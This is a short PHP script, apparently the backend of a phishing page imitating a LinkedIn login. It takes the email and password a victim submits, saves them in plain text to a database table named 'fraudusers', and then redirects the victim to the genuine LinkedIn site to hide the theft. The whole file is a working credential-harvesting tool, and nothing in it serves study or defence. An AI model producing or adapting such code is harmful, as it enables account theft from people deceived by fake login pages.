<?php
require_once "database.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $email = $_POST['email'];
    $password = $_POST['password'];

   
    $sql = "INSERT INTO fraudusers (email, password) VALUES (?, ?)";
    
    $stmt = mysqli_stmt_init($conn);
    if (mysqli_stmt_prepare($stmt, $sql)) {
        mysqli_stmt_bind_param($stmt, "ss", $email, $password);
        mysqli_stmt_execute($stmt);

        
        header("Location: https://www.linkedin.com/");
        exit;
    } else {
        echo "Помилка: " . mysqli_error($conn);
    }
}
?>
